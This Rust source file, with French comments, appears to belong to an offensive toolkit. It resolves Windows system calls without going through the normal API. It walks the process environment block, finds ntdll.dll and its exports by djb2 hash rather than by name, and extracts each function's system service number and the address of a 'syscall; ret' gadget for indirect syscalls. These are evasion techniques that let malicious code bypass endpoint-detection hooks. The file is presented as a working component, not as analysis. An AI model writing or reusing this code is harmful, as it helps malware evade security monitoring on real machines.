use std::ptr::addr_of;
use std::arch::asm;
use core::slice;

use ntapi::ntldr::PLDR_DATA_TABLE_ENTRY;
use ntapi::FIELD_OFFSET;
use ntapi::ntpebteb::{PPEB, TEB};
use ntapi::ntpsapi::PPEB_LDR_DATA;

use winapi::shared::minwindef::{PWORD, PUSHORT};
use winapi::shared::ntdef::{NULL, PVOID, ULONG, PUCHAR, PLIST_ENTRY};
use winapi::um::winnt::{PIMAGE_DOS_HEADER, PIMAGE_DATA_DIRECTORY, PIMAGE_NT_HEADERS, PIMAGE_EXPORT_DIRECTORY};

use crate::syscalls::obf::djb2_hash;

/// Lire un qword depuis le segment GS (x64)
#[cfg(target_arch = "x86_64")]
pub unsafe fn __readgsqword(offset: u32) -> u64 {
    let out: u64;
    asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}

/// Obtenir le TEB (Thread Environment Block)
pub unsafe fn nt_current_teb() -> *mut TEB {
    use winapi::um::winnt::NT_TIB;
    let teb_offset = FIELD_OFFSET!(NT_TIB, _Self) as u32;
    __readgsqword(teb_offset) as *mut TEB
}

/// Obtenir le PEB (Process Environment Block)
pub unsafe fn nt_current_peb() -> PPEB {
    (*nt_current_teb()).ProcessEnvironmentBlock
}

/// Calculer la longueur d'une string C
pub fn get_cstr_len(pointer: *const char) -> usize {
    let mut tmp: u64 = pointer as u64;
    unsafe {
        while *(tmp as *const u8) != 0 {
            tmp += 1;
        }
    }
    (tmp - pointer as u64) as _
}

/// Trouver l'adresse d'un module par son hash (parcours du PEB)
fn get_module_addr(hash: ULONG) -> PVOID {
    let ldr: PPEB_LDR_DATA;
    let header: PLIST_ENTRY;
    let mut dt_entry: PLDR_DATA_TABLE_ENTRY;
    let mut entry: PLIST_ENTRY;
    let mut mod_hash: ULONG;
    let mut mod_name: &[u8];
    let mut mod_len: usize;

    unsafe {
        ldr = (*nt_current_peb()).Ldr;
        header = addr_of!((*ldr).InLoadOrderModuleList) as PLIST_ENTRY;
        entry = (*header).Flink;

        while header as u64 != entry as u64 {
            dt_entry = entry as PLDR_DATA_TABLE_ENTRY;
            mod_len = ((*dt_entry).BaseDllName.Length) as usize;
            mod_name = slice::from_raw_parts(
                (*dt_entry).BaseDllName.Buffer as *const u8,
                mod_len,
            );
            mod_hash = djb2_hash(mod_name) as ULONG;

            if mod_hash == hash {
                return (*dt_entry).DllBase;
            }

            entry = (*entry).Flink;
        }
    }
    NULL
}

/// Trouver l'adresse d'une fonction par son hash dans l'export table
fn get_function_addr(module_addr: PVOID, hash: u32) -> PVOID {
    let dos_header: PIMAGE_DOS_HEADER;
    let nt_header: PIMAGE_NT_HEADERS;
    let data_dir: PIMAGE_DATA_DIRECTORY;
    let exp_dir: PIMAGE_EXPORT_DIRECTORY;
    let addr_funcs: PWORD;
    let addr_names: PWORD;
    let addr_ords: PUSHORT;
    let mut str_addr: PUCHAR;
    let mut str_len: usize;
    let addr_list: &[u32];
    let name_list: &[u32];
    let ord_list: &[u16];

    dos_header = module_addr as PIMAGE_DOS_HEADER;

    unsafe {
        nt_header = (dos_header as u64 + (*dos_header).e_lfanew as u64) as PIMAGE_NT_HEADERS;
        data_dir = addr_of!((*nt_header).OptionalHeader.DataDirectory[0]) as PIMAGE_DATA_DIRECTORY;

        if (*data_dir).VirtualAddress != 0 {
            exp_dir = (dos_header as u64 + (*data_dir).VirtualAddress as u64) as PIMAGE_EXPORT_DIRECTORY;
            addr_funcs = (dos_header as u64 + (*exp_dir).AddressOfFunctions as u64) as PWORD;
            addr_names = (dos_header as u64 + (*exp_dir).AddressOfNames as u64) as PWORD;
            addr_ords = (dos_header as u64 + (*exp_dir).AddressOfNameOrdinals as u64) as PUSHORT;

            name_list = slice::from_raw_parts(addr_names as *const u32, (*exp_dir).NumberOfNames as usize);
            ord_list = slice::from_raw_parts(addr_ords as *const u16, (*exp_dir).NumberOfNames as usize);
            addr_list = slice::from_raw_parts(addr_funcs as *const u32, (*exp_dir).NumberOfNames as usize);

            for iter in 0..(*exp_dir).NumberOfNames as usize {
                str_addr = (dos_header as u64 + name_list[iter] as u64) as PUCHAR;
                str_len = get_cstr_len(str_addr as _);
                if hash == djb2_hash(slice::from_raw_parts(str_addr as _, str_len)) {
                    return (dos_header as u64 + addr_list[ord_list[iter] as usize] as u64) as PVOID;
                }
            }
        }
    }
    NULL
}

/// Résoudre le SSN (System Service Number) et l'adresse du gadget "syscall; ret"
/// Retourne (SSN, adresse_gadget)
pub fn get_ssn(hash: u32) -> (u16, u64) {
    let ntdll_addr: PVOID;
    let funct_addr: PVOID;
    let ssn_addr: u64;
    let ssn: u16;

    ntdll_addr = get_module_addr(crate::obf!("ntdll.dll"));
    funct_addr = get_function_addr(ntdll_addr, hash);

    unsafe {
        // Le SSN est à offset +4 dans le prologue de la fonction NT
        // Bytecode typique:
        //   mov r10, rcx    (4C 8B D1)
        //   mov eax, SSN    (B8 XX 00 00 00)  <- SSN ici
        ssn = *((funct_addr as u64 + 4) as *const u16);
    }

    // Le gadget "syscall; ret" est généralement à offset +0x12
    ssn_addr = funct_addr as u64 + 0x12;

    (ssn, ssn_addr)
}
